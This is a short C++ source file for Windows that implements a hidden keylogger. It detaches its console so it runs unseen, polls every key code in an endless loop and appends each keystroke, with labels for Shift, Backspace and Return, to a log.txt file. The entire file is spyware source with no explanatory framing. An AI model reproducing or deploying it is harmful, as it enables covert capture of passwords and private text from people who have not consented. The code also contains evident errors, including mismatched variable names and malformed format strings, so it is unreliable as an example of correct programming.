#include <iostream>
#include <windows.h>

using namespace std;

int Save(int _Key, char *file);

int main() {

    FreeConsole();

    char i;

    while (true) {
        Sleep(10);
        for (i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                Save(i, "log.txt");
            }
        }    
    }
    return 0;
}

int Save(int _Key, char *file) {
    
    cout << _Key << endl;

    Sleep(10);

    FILE *OUTPUT_FILE;

    OUTPUT_FILE = fopen(file, "a");

    if (_key == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s" "[Shift]");
    else if (_key == VK_BACK)
        fprintf(OUTPUT_FILE, "%s" "[Backspace]");
    else if (_key == VK_LBUTTON)
        fprintf(OUTPUT_FILE, "%s" "[Left Mouse Button]");
    else if (_key == VK_RETURN)
        fprintf(OUTPUT_FILE, "%s" "[Return]");
    else if (_key == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s" "[Escape]");   
    fprintf(OUTPUT_FILE, "%s", &_Key);
    fclose(OUTPUT_FILE);

    return 0; 
};